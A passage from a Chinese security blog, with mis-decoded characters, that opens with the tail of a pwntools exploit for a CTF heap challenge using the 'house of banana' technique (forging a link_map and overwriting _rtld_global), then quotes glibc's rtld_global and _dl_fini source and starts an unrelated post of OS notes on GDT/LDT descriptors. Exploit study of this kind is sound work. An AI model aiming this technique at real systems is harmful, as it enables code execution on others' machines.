class="number">0</span>)*<span class="number">12</span> + p64(bin_addr)</span><br><span class="line"></span><br><span class="line">fake_content = house_of_banana(fake_addr + <span class="number">0x10</span>, l_next, gadget, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0xf0</span>, <span class="number">1</span>)</span><br><span class="line">resize(<span class="number">3</span>, <span class="number">0xf0</span>, <span class="number">5</span>)</span><br><span class="line">fake_content = fake_content.ljust(<span class="number">0xf0</span> * <span class="number">5</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># edit(3, fake_content)</span></span><br><span class="line">sla(prefix, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">sla(<span class="string">&quot;Enter idx: &quot;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    sl(fake_content[<span class="number">0xf0</span>*i:<span class="number">0xf0</span>*(i+<span class="number">1</span>)])</span><br><span class="line"></span><br><span class="line">rate(-<span class="number">8</span>, <span class="number">1</span>, <span class="string">&#x27;y&#x27;</span>, p64(<span class="number">0xffffffffffff01ff</span>) + p64(_rtld_global))</span><br><span class="line">edit(-<span class="number">5</span>, p64(fake_addr + <span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">bpp()</span><br><span class="line">exit()</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;past&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>
<h1>é™„å½•</h1>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">struct rtld_global</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">#endif</span></span><br><span class="line">  /* Don<span class="string">&#x27;t change the order of the following elements.  &#x27;</span>dl_loaded<span class="string">&#x27;</span></span><br><span class="line"><span class="string">     must remain the first element.  Forever.  */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/* Non-shared code has no support for multiple namespaces.  */</span></span><br><span class="line"><span class="string">#ifdef SHARED</span></span><br><span class="line"><span class="string"># define DL_NNS 16</span></span><br><span class="line"><span class="string">#else</span></span><br><span class="line"><span class="string"># define DL_NNS 1</span></span><br><span class="line"><span class="string">#endif</span></span><br><span class="line"><span class="string">  EXTERN struct link_namespaces</span></span><br><span class="line"><span class="string">  &#123;</span></span><br><span class="line"><span class="string">    /* A pointer to the map for the main map.  */</span></span><br><span class="line"><span class="string">    struct link_map *_ns_loaded;</span></span><br><span class="line"><span class="string">    /* Number of object in the _dl_loaded list.  */</span></span><br><span class="line"><span class="string">    unsigned int _ns_nloaded;</span></span><br><span class="line"><span class="string">    /* Direct pointer to the searchlist of the main object.  */</span></span><br><span class="line"><span class="string">    struct r_scope_elem *_ns_main_searchlist;</span></span><br><span class="line"><span class="string">    /* This is zero at program start to signal that the global scope map is</span></span><br><span class="line"><span class="string">       allocated by rtld.  Later it keeps the size of the map.  It might be</span></span><br><span class="line"><span class="string">       reset if in _dl_close if the last global object is removed.  */</span></span><br><span class="line"><span class="string">    unsigned int _ns_global_scope_alloc;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* During dlopen, this is the number of objects that still need to</span></span><br><span class="line"><span class="string">       be added to the global scope map.  It has to be taken into</span></span><br><span class="line"><span class="string">       account when resizing the map, for future map additions after</span></span><br><span class="line"><span class="string">       recursive dlopen calls from ELF constructors.  */</span></span><br><span class="line"><span class="string">    unsigned int _ns_global_scope_pending_adds;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Once libc.so has been loaded into the namespace, this points to</span></span><br><span class="line"><span class="string">       its link map.  */</span></span><br><span class="line"><span class="string">    struct link_map *libc_map;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Search table for unique objects.  */</span></span><br><span class="line"><span class="string">    struct unique_sym_table</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">      __rtld_lock_define_recursive (, lock)</span></span><br><span class="line"><span class="string">      struct unique_sym</span></span><br><span class="line"><span class="string">      &#123;</span></span><br><span class="line"><span class="string">    uint32_t hashval;</span></span><br><span class="line"><span class="string">    const char *name;</span></span><br><span class="line"><span class="string">    const ElfW(Sym) *sym;</span></span><br><span class="line"><span class="string">    const struct link_map *map;</span></span><br><span class="line"><span class="string">      &#125; *entries;</span></span><br><span class="line"><span class="string">      size_t size;</span></span><br><span class="line"><span class="string">      size_t n_elements;</span></span><br><span class="line"><span class="string">      void (*free) (void *);</span></span><br><span class="line"><span class="string">    &#125; _ns_unique_sym_table;</span></span><br><span class="line"><span class="string">    /* Keep track of changes to each namespace&#x27;</span> <span class="built_in">list</span>.  */</span><br><span class="line">    struct r_debug _ns_debug;</span><br><span class="line">  &#125; _dl_ns[DL_NNS];</span><br><span class="line">  /* One higher than index of last used namespace.  */</span><br><span class="line">  EXTERN size_t _dl_nns;</span><br><span class="line">.................................................................................</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="dl-finiæºç ">dl_finiæºç </h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Call the termination functions of loaded shared objects.</span></span><br><span class="line"><span class="comment">   Copyright (C) 1995-2022 Free Software Foundation, Inc.</span></span><br><span class="line"><span class="comment">   This file is part of the GNU C Library.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   The GNU C Library is free software; you can redistribute it and/or</span></span><br><span class="line"><span class="comment">   modify it under the terms of the GNU Lesser General Public</span></span><br><span class="line"><span class="comment">   License as published by the Free Software Foundation; either</span></span><br><span class="line"><span class="comment">   version 2.1 of the License, or (at your option) any later version.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   The GNU C Library is distributed in the hope that it will be useful,</span></span><br><span class="line"><span class="comment">   but WITHOUT ANY WARRANTY; without even the implied warranty of</span></span><br><span class="line"><span class="comment">   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU</span></span><br><span class="line"><span class="comment">   Lesser General Public License for more details.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   You should have received a copy of the GNU Lesser General Public</span></span><br><span class="line"><span class="comment">   License along with the GNU C Library; if not, see</span></span><br><span class="line"><span class="comment">   &lt;https://www.gnu.org/licenses/&gt;.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ldsodefs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;elf-initfini.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Type of the constructor functions.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*<span class="type">fini_t</span>)</span> <span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line">_dl_fini (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Lots of fun ahead.  We have to call the destructors for all still</span></span><br><span class="line"><span class="comment">     loaded objects, in all namespaces.  The problem is that the ELF</span></span><br><span class="line"><span class="comment">     specification now demands that dependencies between the modules</span></span><br><span class="line"><span class="comment">     are taken into account.  I.e., the destructor for a module is</span></span><br><span class="line"><span class="comment">     called before the ones for any of its dependencies.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     To make things more complicated, we cannot simply use the reverse</span></span><br><span class="line"><span class="comment">     order of the constructors.  Since the user might have loaded objects</span></span><br><span class="line"><span class="comment">     using `dlopen&#x27; there are possibly several other modules with its</span></span><br><span class="line"><span class="comment">     dependencies to be taken into account.  Therefore we have to start</span></span><br><span class="line"><span class="comment">     determining the order of the modules once again from the beginning.  */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We run the destructors of the main namespaces last.  As for the</span></span><br><span class="line"><span class="comment">     other namespaces, we pick run the destructors in them in reverse</span></span><br><span class="line"><span class="comment">     order of the namespace ID.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="type">int</span> do_audit = <span class="number">0</span>;</span><br><span class="line"> again:</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="keyword">for</span> (Lmid_t ns = GL(dl_nns) - <span class="number">1</span>; ns &gt;= <span class="number">0</span>; --ns)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Protect against concurrent loads and unloads.  */</span></span><br><span class="line">      __rtld_lock_lock_recursive (GL(dl_load_lock));</span><br><span class="line"></span><br><span class="line">      <span class="type">unsigned</span> <span class="type">int</span> nloaded = GL(dl_ns)[ns]._ns_nloaded;</span><br><span class="line">      <span class="comment">/* No need to do anything for empty namespaces or those used for</span></span><br><span class="line"><span class="comment">	 auditing DSOs.  */</span></span><br><span class="line">      <span class="keyword">if</span> (nloaded == <span class="number">0</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">	  || GL(dl_ns)[ns]._ns_loaded-&gt;l_auditing != do_audit</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	  )</span><br><span class="line">	__rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">	  _dl_audit_activity_nsid (ns, LA_ACT_DELETE);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* Now we can allocate an array to hold all the pointers and</span></span><br><span class="line"><span class="comment">	     copy the pointers in.  */</span></span><br><span class="line">	  <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">maps</span>[<span class="title">nloaded</span>];</span></span><br><span class="line"></span><br><span class="line">	  <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">	  <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span>;</span></span><br><span class="line">	  assert (nloaded != <span class="number">0</span> || GL(dl_ns)[ns]._ns_loaded == <span class="literal">NULL</span>);</span><br><span class="line">	  <span class="keyword">for</span> (l = GL(dl_ns)[ns]._ns_loaded, i = <span class="number">0</span>; l != <span class="literal">NULL</span>; l = l-&gt;l_next)</span><br><span class="line">	    <span class="comment">/* Do not handle ld.so in secondary namespaces.  */</span></span><br><span class="line">	    <span class="keyword">if</span> (l == l-&gt;l_real)</span><br><span class="line">	      &#123;</span><br><span class="line">		assert (i &lt; nloaded);</span><br><span class="line"></span><br><span class="line">		maps[i] = l;</span><br><span class="line">		l-&gt;l_idx = i;</span><br><span class="line">		++i;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* Bump l_direct_opencount of all objects so that they</span></span><br><span class="line"><span class="comment">		   are not dlclose()ed from underneath us.  */</span></span><br><span class="line">		++l-&gt;l_direct_opencount;</span><br><span class="line">	      &#125;</span><br><span class="line">	  assert (ns != LM_ID_BASE || i == nloaded);</span><br><span class="line">	  assert (ns == LM_ID_BASE || i == nloaded || i == nloaded - <span class="number">1</span>);</span><br><span class="line">	  <span class="type">unsigned</span> <span class="type">int</span> nmaps = i;</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* Now we have to do the sorting.  We can skip looking for the</span></span><br><span class="line"><span class="comment">	     binary itself which is at the front of the search list for</span></span><br><span class="line"><span class="comment">	     the main namespace.  */</span></span><br><span class="line">	  _dl_sort_maps (maps, nmaps, (ns == LM_ID_BASE), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* We do not rely on the linked list of loaded object anymore</span></span><br><span class="line"><span class="comment">	     from this point on.  We have our own list here (maps).  The</span></span><br><span class="line"><span class="comment">	     various members of this list cannot vanish since the open</span></span><br><span class="line"><span class="comment">	     count is too high and will be decremented in this loop.  So</span></span><br><span class="line"><span class="comment">	     we release the lock so that some code which might be called</span></span><br><span class="line"><span class="comment">	     from a destructor can directly or indirectly access the</span></span><br><span class="line"><span class="comment">	     lock.  */</span></span><br><span class="line">	  __rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* &#x27;maps&#x27; now contains the objects in the right order.  Now</span></span><br><span class="line"><span class="comment">	     call the destructors.  We have to process this array from</span></span><br><span class="line"><span class="comment">	     the front.  */</span></span><br><span class="line">	  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nmaps; ++i)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span> =</span> maps[i];</span><br><span class="line"></span><br><span class="line">	      <span class="keyword">if</span> (l-&gt;l_init_called)</span><br><span class="line">		&#123;</span><br><span class="line">		  <span class="comment">/* Make sure nothing happens if we are called twice.  */</span></span><br><span class="line">		  l-&gt;l_init_called = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">		  <span class="comment">/* Is there a destructor function?  */</span></span><br><span class="line">		  <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span></span><br><span class="line">		      || (ELF_INITFINI &amp;&amp; l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>))</span><br><span class="line">		    &#123;</span><br><span class="line">		      <span class="comment">/* When debugging print a message first.  */</span></span><br><span class="line">		      <span class="keyword">if</span> (__builtin_expect (GLRO(dl_debug_mask)</span><br><span class="line">					    &amp; DL_DEBUG_IMPCALLS, <span class="number">0</span>))</span><br><span class="line">			_dl_debug_printf (<span class="string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>,</span><br><span class="line">					  DSO_FILENAME (l-&gt;l_name),</span><br><span class="line">					  ns);</span><br><span class="line"></span><br><span class="line">		      <span class="comment">/* First see whether an array is given.  */</span></span><br><span class="line">		      <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>)</span><br><span class="line">			&#123;</span><br><span class="line">			  ElfW(Addr) *<span class="built_in">array</span> =</span><br><span class="line">			    (ElfW(Addr) *) (l-&gt;l_addr</span><br><span class="line">					    + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">			  <span class="type">unsigned</span> <span class="type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">					    / <span class="keyword">sizeof</span> (ElfW(Addr)));</span><br><span class="line">			  <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">			    ((<span class="type">fini_t</span>) <span class="built_in">array</span>[i]) ();</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		      <span class="comment">/* Next try the old-style destructor.  */</span></span><br><span class="line">		      <span class="keyword">if</span> (ELF_INITFINI &amp;&amp; l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>)</span><br><span class="line">			DL_CALL_DT_FINI</span><br><span class="line">			  (l, l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr);</span><br><span class="line">		    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">		  <span class="comment">/* Auditing checkpoint: another object closed.  */</span></span><br><span class="line">		  _dl_audit_objclose (l);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	      <span class="comment">/* Correct the previous increment.  */</span></span><br><span class="line">	      --l-&gt;l_direct_opencount;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">	  _dl_audit_activity_nsid (ns, LA_ACT_CONSISTENT);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="keyword">if</span> (! do_audit &amp;&amp; GLRO(dl_naudit) &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      do_audit = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">goto</span> again;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_debug_mask) &amp; DL_DEBUG_STATISTICS))</span><br><span class="line">    _dl_debug_printf (<span class="string">&quot;\nruntime linker statistics:\n&quot;</span></span><br><span class="line">		      <span class="string">&quot;           final number of relocations: %lu\n&quot;</span></span><br><span class="line">		      <span class="string">&quot;final number of relocations from cache: %lu\n&quot;</span>,</span><br><span class="line">		      GL(dl_num_relocations),</span><br><span class="line">		      GL(dl_num_cache_relocations));</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="rtld-globalç»“æ„ä½“">rtld_globalç»“æ„ä½“</h2>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/09/30/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B001/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/header.png">
      <meta itemprop="name" content="hkbin">
      <meta itemprop="description" content="hkbin hkbin hkbin">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hkbinçš„å°åšå®¢~">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/09/30/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B001/" class="post-title-link" itemprop="url">æ“ä½œç³»ç»Ÿè¯»ä¹¦ç¬”è®°01</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2023-09-30 23:21:43 / ä¿®æ”¹æ—¶é—´ï¼š23:27:05" itemprop="dateCreated datePublished" datetime="2023-09-30T23:21:43+08:00">2023-09-30</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" itemprop="url" rel="index"><span itemprop="name">æ“ä½œç³»ç»Ÿ</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="æœ¬æ–‡å­—æ•°">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>4.5k</span>
            </span>
            <span class="post-meta-item" title="é˜…è¯»æ—¶é•¿">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>16 åˆ†é’Ÿ</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1>osè¯»ä¹¦ç¬”è®°1</h1>
<h1>ç³»ç»Ÿæ¶æ„æ¦‚å†µ</h1>
<p><img src="./images/os%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B01%203ca99f0311ef4b6fa13a100e6296dfe4/Untitled.png" alt="Untitled"></p>
<h3 id="å…¨å±€æè¿°ç¬¦è¡¨å’Œå±€éƒ¨æè¿°ç¬¦è¡¨-GDTå’ŒLDT">å…¨å±€æè¿°ç¬¦è¡¨å’Œå±€éƒ¨æè¿°ç¬¦è¡¨(GDTå’ŒLDT)</h3>
<hr>
<p><strong>è¿™ä¸¤ä¸ªè¡¨æœ‰ä»€ä¹ˆç”¨</strong></p>
<p>è¿›å…¥äº†ä¿æŠ¤æ¨¡å¼ä¹‹åï¼Œä»£ç æ®µã€æ•°æ®æ®µã€å †æ ˆæ®µç­‰å†…å­˜æ®µä¸å†æ˜¯é€šè¿‡æ®µå¯„å­˜å™¨è·å¾—æ®µåŸºå€å³å¯ä½¿ç”¨ï¼Œæ“ä½œç³»ç»ŸæŠŠæ®µå®šä¹‰å¥½ï¼Œè®°å½•åœ¨å…¨å±€æè¿°ç¬¦è¡¨ã€‚</p>
<p>è€Œå±€éƒ¨æè¿°ç¬¦è¡¨åˆ™æ˜¯å±€éƒ¨çš„ï¼Œå®ƒå’Œå…¨å±€æè¿°ç¬¦è¡¨ç›¸æ¯”ï¼Œå°±ç›¸å½“äºä¸€ä¸ªæ˜¯ä¸€çº§æè¿°ç¬¦è¡¨(GDT)ã€ä¸€ä¸ªæ˜¯äºŒçº§æè¿°ç¬¦è¡¨(LDT)</p>
<p><strong>è¡¨é‡Œé¢å­˜çš„æ˜¯ä»€ä¹ˆ</strong></p>
<p>æè¿°ç¬¦è¡¨é‡Œé¢ä¿å­˜çš„éƒ½æ˜¯æ®µæè¿°ç¬¦ï¼Œæ®µæè¿°ç¬¦è®°å½•äº†å„ä¸ªæ®µçš„ä¿¡æ¯ã€‚å¦‚å›¾æ‰€ç¤ºï¼š</p>
<p><img src="./images/os%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B01%203ca99f0311ef4b6fa13a100e6296dfe4/Untitled%201.png" alt="Untitled"></p>
<p>å…¶ä¸­å„ä¸ªæ ‡å¿—ä½éƒ½è®°å½•ç€å…³äºæ®µçš„ä¸åŒä¿¡æ¯</p>
<p><strong>å¦‚ä½•æ‰¾åˆ°GDTå’ŒLDTé‡Œé¢çš„å†…å®¹</strong></p>
<p>æœ‰äº†æ®µæè¿°ç¬¦ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥å®šä¹‰å„ç§å†…å­˜æ®µï¼Œå¹¶ä¿å­˜åˆ°GDTå’ŒLDTä¸­ï¼Œæ­¤æ—¶CPUé€šè¿‡GDTRå’ŒLDTRåˆ†åˆ«æŸ¥æ‰¾GDTå’ŒLDTè¡¨ã€‚</p>
<p>GDTRå¯„å­˜å™¨æ•°æ®æ ¼å¼å¦‚ä¸‹ï¼š</p>
<p><img src="./images/os%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B01%203ca99f0311ef4b6fa13a100e6296dfe4/Untitled%202.png" alt="Untitled"></p>
<p>å› æ­¤GDTä¸­å¯ä»¥å®¹çº³æ®µæè¿°ç¬¦ä¸º8192ä¸ª</p>
<p>è¿™GDTRå¯„å­˜å™¨åˆå§‹åŒ–éœ€è¦ç”¨åˆ°lgdt</p>
<p>å®šä½åˆ°æŸä¸ªæ®µæè¿°ç¬¦ï¼Œéœ€è¦ç”¨åˆ°<strong>æ®µé€‰æ‹©å­</strong></p>
<p>ä¿æŠ¤æ¨¡å¼ä¸‹æ®µå¯„å­˜å™¨å­˜å…¥çš„æ˜¯æ®µé€‰æ‹©å­</p>
<p><img src="./images/os%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B01%203ca99f0311ef4b6fa13a100e6296dfe4/Untitled%203.png" alt="Untitled"></p>
<p>å¦‚æ­¤ä¸€æ¥ï¼Œå³å¯æ‰¾åˆ°æŒ‡å®šçš„æ®µï¼ŒCPUå³å¯ä»æ®µæè¿°ç¬¦ä¸­å–å‡ºæ®µåŸºå€ï¼Œå†åŠ ä¸Šæ®µå†…åï¼Œå½¢æˆäº†-æ®µåŸºå€ï¼šæ®µå†…åç§»åœ°å€-çš„å†…å­˜è®¿é—®å½¢å¼</p>
<h3 id="é—¨æè¿°ç¬¦">é—¨æè¿°ç¬¦</h3>
<hr>
